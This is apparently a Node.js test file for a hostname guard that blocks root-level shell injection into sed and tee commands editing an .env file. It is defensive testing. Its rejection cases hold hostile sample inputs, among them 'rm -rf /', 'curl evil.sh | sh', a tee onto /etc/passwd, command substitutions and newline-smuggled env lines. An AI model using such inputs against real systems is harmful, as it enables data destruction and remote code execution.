/**
 * Hostname guard.
 *
 * Whatever survives requireHost() is interpolated into commands that run as
 * root inside the VM:
 *
 *     sudo sed -i 's|^APP_URL=.*|APP_URL=https://<host>|' .../.env
 *     echo 'PUSHER_HOST=<host>' | sudo tee -a .../.env
 *
 * so this is a trust boundary, and the rejection cases below are the point of
 * the file — a quote, a newline or a semicolon reaching those lines is a
 * root-level injection.
 *
 *   node --test 'test/*.js'
 */
'use strict';

const { test } = require('node:test');
const assert = require('node:assert');
const D = require('../lib/domain');

/* ── normalisation ──────────────────────────────────────────────────────── */

test('strips what people paste but do not mean', () => {
  assert.strictEqual(D.normaliseHost('  coolify.example.com  '), 'coolify.example.com');
  assert.strictEqual(D.normaliseHost('https://coolify.example.com'), 'coolify.example.com');
  assert.strictEqual(D.normaliseHost('HTTP://coolify.example.com'), 'coolify.example.com');
  assert.strictEqual(D.normaliseHost('https://coolify.example.com///'), 'coolify.example.com');
});

test('survives junk input without throwing', () => {
  for (const bad of [null, undefined, 0, false, {}, []]) {
    assert.strictEqual(typeof D.normaliseHost(bad), 'string');
  }
  assert.strictEqual(D.normaliseHost(null), '');
});

/* ── acceptance ─────────────────────────────────────────────────────────── */

test('accepts the hostnames people actually use', () => {
  for (const ok of [
    'example.com',
    'coolify.example.com',
    'deploy.eu-west-1.example.co.uk',
    'my-app.example.io',
    'x1.example.dev',
  ]) {
    assert.ok(D.isValidHost(ok), `${ok} should be valid`);
    assert.strictEqual(D.requireHost(ok), ok);
  }
});

/* ── rejection: the reason this file exists ─────────────────────────────── */

test('rejects anything that could reach the shell', () => {
  // Each of these would otherwise land inside a sed expression or a tee
  // argument running under sudo.
  for (const bad of [
    "example.com'; rm -rf /;'",
    'example.com;reboot',
    'example.com|tee /etc/passwd',
    'example.com && curl evil.sh | sh',
    'example.com$(whoami)',
    'example.com`id`',
    'example.com\nPUSHER_HOST=evil.com',
    'example.com\r\nAPP_URL=http://evil',
    'exa mple.com',
    'example.com/../../etc',
    '"example.com"',
    "ex'ample.com",
  ]) {
    assert.ok(!D.isValidHost(bad), `${JSON.stringify(bad)} must be rejected`);
    assert.throws(() => D.requireHost(bad), /not a valid hostname/,
      `${JSON.stringify(bad)} must throw`);
  }
});

test('rejects near-misses that are not hostnames', () => {
  for (const bad of ['example', 'example.', '.example.com', 'example.c', 'localhost',
                     'http://', '192.168.1.1:8000', 'example.com:8000']) {
    assert.ok(!D.isValidHost(bad), `${bad} must be rejected`);
  }
});

test('an empty hostname says so, rather than "not valid"', () => {
  // Different cause, different message — the UI shows these verbatim.
  for (const empty of ['', '   ', 'https://', null, undefined]) {
    assert.throws(() => D.requireHost(empty), /No hostname given/);
  }
});

test('refuses an over-long name', () => {
  const long = 'a'.repeat(250) + '.example.com';
  assert.ok(long.length > 253);
  assert.ok(!D.isValidHost(long));
});

test('CONTROL: the regex really can fail', () => {
  // Proves the acceptance assertions above are not passing on a regex that
  // matches everything.
  assert.ok(!D.HOSTNAME.test('no dots here'));
  assert.ok(D.HOSTNAME.test('example.com'));
});
